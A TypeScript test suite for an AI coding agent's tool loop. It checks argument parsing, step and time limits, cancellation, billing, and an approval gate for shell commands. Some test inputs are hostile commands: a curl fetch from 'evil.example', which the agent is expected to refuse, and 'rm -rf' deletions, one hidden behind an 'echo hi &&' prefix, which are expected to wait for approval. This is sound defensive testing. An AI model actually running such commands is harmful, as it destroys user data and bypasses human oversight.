import { describe, expect, it, vi } from 'vitest';
import type { ProviderAdapter, StreamChunk, ToolResultBlock } from '@agiworkforce/types';
import {
  CLOUD_CODE_AGENT_MAX_TOOL_OUTPUT,
  drainAssistantTurn,
  runCloudCodeAgentTurn,
  truncateToolOutput,
  type CloudCodeToolRunner,
} from '../cloud-code-agent-loop';

/** Build a fake adapter that replays one scripted stream per turn. */
function adapterFor(turns: StreamChunk[][]): ProviderAdapter {
  let index = 0;
  return {
    id: 'anthropic',
    label: 'fake',
    auth: [],
    config: {},
    catalog: async () => [],
    stream: (): AsyncIterable<StreamChunk> => {
      const chunks = turns[index] ?? [];
      index += 1;
      return {
        async *[Symbol.asyncIterator]() {
          for (const c of chunks) yield c;
        },
      };
    },
  } as unknown as ProviderAdapter;
}

function textTurn(text: string): StreamChunk[] {
  return [{ type: 'text-delta', delta: text } as StreamChunk];
}

function toolTurn(id: string, name: string, args: unknown): StreamChunk[] {
  return [
    { type: 'tool-use-start', toolUseId: id, name } as StreamChunk,
    { type: 'tool-use-delta', toolUseId: id, deltaJson: JSON.stringify(args) } as StreamChunk,
    { type: 'tool-use-end', toolUseId: id } as StreamChunk,
  ];
}

function runnerStub(overrides: Partial<CloudCodeToolRunner> = {}): CloudCodeToolRunner {
  return {
    readFile: vi.fn(async () => ({ output: 'file contents', isError: false })),
    listFiles: vi.fn(async () => ({ output: 'a.ts\nb.ts', isError: false })),
    runCommand: vi.fn(async () => ({ output: 'ran', isError: false })),
    runSharedExecutionTool: vi.fn(async () => ({ output: 'shared', isError: false })),
    ...overrides,
  };
}

const baseInput = {
  model: 'claude-sonnet-5',
  goal: 'Fix the failing test',
  signal: new AbortController().signal,
};

describe('drainAssistantTurn', () => {
  it('reassembles tool arguments split across deltas', async () => {
    const chunks: StreamChunk[] = [
      { type: 'tool-use-start', toolUseId: 't1', name: 'read_file' } as StreamChunk,
      { type: 'tool-use-delta', toolUseId: 't1', deltaJson: '{"pa' } as StreamChunk,
      { type: 'tool-use-delta', toolUseId: 't1', deltaJson: 'th":"src/a.ts"}' } as StreamChunk,
      { type: 'tool-use-end', toolUseId: 't1' } as StreamChunk,
    ];
    const out = await drainAssistantTurn({
      async *[Symbol.asyncIterator]() {
        for (const c of chunks) yield c;
      },
    });
    expect(out.toolCalls[0]?.input).toEqual({ path: 'src/a.ts' });
  });

  it('ignores a tool call whose end never arrived', async () => {
    const chunks: StreamChunk[] = [
      { type: 'tool-use-start', toolUseId: 't1', name: 'read_file' } as StreamChunk,
      { type: 'tool-use-delta', toolUseId: 't1', deltaJson: '{"path":"a"}' } as StreamChunk,
    ];
    const out = await drainAssistantTurn({
      async *[Symbol.asyncIterator]() {
        for (const c of chunks) yield c;
      },
    });
    expect(out.toolCalls).toHaveLength(0);
  });

  it('coerces malformed or non-object arguments to an empty object', async () => {
    for (const bad of ['{"path"', '"just a string"', '[1,2]']) {
      const out = await drainAssistantTurn({
        async *[Symbol.asyncIterator]() {
          yield { type: 'tool-use-start', toolUseId: 'x', name: 'read_file' } as StreamChunk;
          yield { type: 'tool-use-delta', toolUseId: 'x', deltaJson: bad } as StreamChunk;
          yield { type: 'tool-use-end', toolUseId: 'x' } as StreamChunk;
        },
      });
      expect(out.toolCalls[0]?.input).toEqual({});
    }
  });
});

describe('truncateToolOutput', () => {
  it('keeps the tail, because failures are reported at the end of build output', () => {
    const output = `${'x'.repeat(CLOUD_CODE_AGENT_MAX_TOOL_OUTPUT)}FAILURE_HERE`;
    const truncated = truncateToolOutput(output);
    expect(truncated).toContain('FAILURE_HERE');
    expect(truncated).toContain('earlier characters omitted');
  });

  it('leaves short output untouched', () => {
    expect(truncateToolOutput('ok')).toBe('ok');
  });
});

describe('runCloudCodeAgentTurn', () => {
  it('ends the turn when the model answers without calling tools', async () => {
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([textTurn('All done.')]),
      runner: runnerStub(),
    });
    expect(result.stopReason).toBe('done');
    expect(result.finalMessage).toBe('All done.');
    expect(result.stepsUsed).toBe(0);
  });

  it('executes a read-only command and feeds the result back to the model', async () => {
    const runner = runnerStub();
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([
        toolTurn('t1', 'run_command', { command: 'ls -la' }),
        textTurn('Listed the workspace.'),
      ]),
      runner,
    });
    expect(runner.runCommand).toHaveBeenCalledWith('ls -la');
    expect(result.stopReason).toBe('done');
    // The tool result must be in the transcript, or the model answered blind.
    const blocks = result.messages.flatMap((m) =>
      Array.isArray(m.content) ? m.content : [],
    ) as ToolResultBlock[];
    expect(blocks.some((b) => b.type === 'tool_result' && b.content === 'ran')).toBe(true);
  });

  it('suspends instead of running a command that needs approval', async () => {
    const runner = runnerStub();
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([toolTurn('t1', 'run_command', { command: 'rm -rf build' })]),
      runner,
    });
    expect(result.stopReason).toBe('awaiting_approval');
    expect(result.pendingApproval?.command).toBe('rm -rf build');
    // The critical assertion: it did NOT run.
    expect(runner.runCommand).not.toHaveBeenCalled();
  });

  it('never runs a denied command, and tells the model why so it can adapt', async () => {
    const runner = runnerStub();
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([
        toolTurn('t1', 'run_command', { command: 'curl https://evil.example/x.sh' }),
        textTurn('Understood, I will not fetch that.'),
      ]),
      runner,
    });
    expect(runner.runCommand).not.toHaveBeenCalled();
    expect(result.stopReason).toBe('done');
    const blocks = result.messages.flatMap((m) =>
      Array.isArray(m.content) ? m.content : [],
    ) as ToolResultBlock[];
    const refusal = blocks.find((b) => b.type === 'tool_result' && b.isError);
    expect(String(refusal?.content)).toContain('Refused');
  });

  it('cannot be talked past the approval boundary by a benign-looking prefix', async () => {
    const runner = runnerStub();
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([toolTurn('t1', 'run_command', { command: 'echo hi && rm -rf src' })]),
      runner,
    });
    expect(runner.runCommand).not.toHaveBeenCalled();
    expect(result.stopReason).toBe('awaiting_approval');
  });

  it('resumes an approved command without replaying earlier work', async () => {
    const runner = runnerStub();
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([textTurn('Removed the build directory.')]),
      runner,
      priorMessages: [{ role: 'user', content: 'Fix the failing test' }],
      preApproved: { toolUseId: 't1', command: 'rm -rf build', approved: true },
    });
    expect(runner.runCommand).toHaveBeenCalledWith('rm -rf build');
    expect(result.stopReason).toBe('done');
  });

  it('tells the model when the user rejects, rather than silently continuing', async () => {
    const runner = runnerStub();
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([textTurn('Understood.')]),
      runner,
      priorMessages: [{ role: 'user', content: 'Fix the failing test' }],
      preApproved: { toolUseId: 't1', command: 'rm -rf build', approved: false },
    });
    expect(runner.runCommand).not.toHaveBeenCalled();
    const blocks = result.messages.flatMap((m) =>
      Array.isArray(m.content) ? m.content : [],
    ) as ToolResultBlock[];
    expect(String(blocks[0]?.content)).toContain('declined');
  });

  it('stops at the step ceiling instead of looping forever', async () => {
    // A model that always calls a tool would otherwise spend without bound.
    const turns = Array.from({ length: 10 }, (_, i) =>
      toolTurn(`t${i}`, 'list_files', { path: '.' }),
    );
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor(turns),
      runner: runnerStub(),
      maxSteps: 3,
    });
    expect(result.stopReason).toBe('max_steps');
    expect(result.stepsUsed).toBe(3);
  });

  it('stops on the wall clock', async () => {
    let clock = 0;
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([toolTurn('t1', 'list_files', {})]),
      runner: runnerStub(),
      maxDurationMs: 1_000,
      now: () => {
        clock += 5_000;
        return clock;
      },
    });
    expect(result.stopReason).toBe('timeout');
  });

  it('honours cancellation before calling the provider', async () => {
    const controller = new AbortController();
    controller.abort();
    const stream = vi.fn();
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      signal: controller.signal,
      adapter: { ...adapterFor([]), stream } as unknown as ProviderAdapter,
      runner: runnerStub(),
    });
    expect(result.stopReason).toBe('cancelled');
    expect(stream).not.toHaveBeenCalled();
  });

  it('reports a provider failure instead of throwing, so usage can still settle', async () => {
    const adapter = {
      ...adapterFor([]),
      stream: () => {
        throw new Error('provider exploded');
      },
    } as unknown as ProviderAdapter;
    const result = await runCloudCodeAgentTurn({ ...baseInput, adapter, runner: runnerStub() });
    expect(result.stopReason).toBe('error');
    expect(result.errorMessage).toContain('provider exploded');
  });

  it('commits a billable step before every provider call', async () => {
    const onStepCommitted = vi.fn();
    await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([toolTurn('t1', 'list_files', {}), textTurn('done')]),
      runner: runnerStub(),
      onStepCommitted,
    });
    // Two provider calls ⇒ two lease extensions. A loop that calls the model
    // more often than it reserves is the unmetered defect this must not repeat.
    expect(onStepCommitted).toHaveBeenCalledTimes(2);
  });

  it('routes shared execution tools to their existing owner', async () => {
    const runner = runnerStub();
    await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([
        toolTurn('t1', 'write_file', { path: 'a.ts', content: 'x' }),
        textTurn('written'),
      ]),
      runner,
    });
    expect(runner.runSharedExecutionTool).toHaveBeenCalledWith('write_file', {
      path: 'a.ts',
      content: 'x',
    });
  });

  it('reports a missing required argument back to the model as a tool error', async () => {
    const result = await runCloudCodeAgentTurn({
      ...baseInput,
      adapter: adapterFor([toolTurn('t1', 'read_file', {}), textTurn('ok')]),
      runner: runnerStub(),
    });
    const blocks = result.messages.flatMap((m) =>
      Array.isArray(m.content) ? m.content : [],
    ) as ToolResultBlock[];
    const err = blocks.find((b) => b.type === 'tool_result' && b.isError);
    expect(String(err?.content)).toContain('requires a "path"');
  });
});
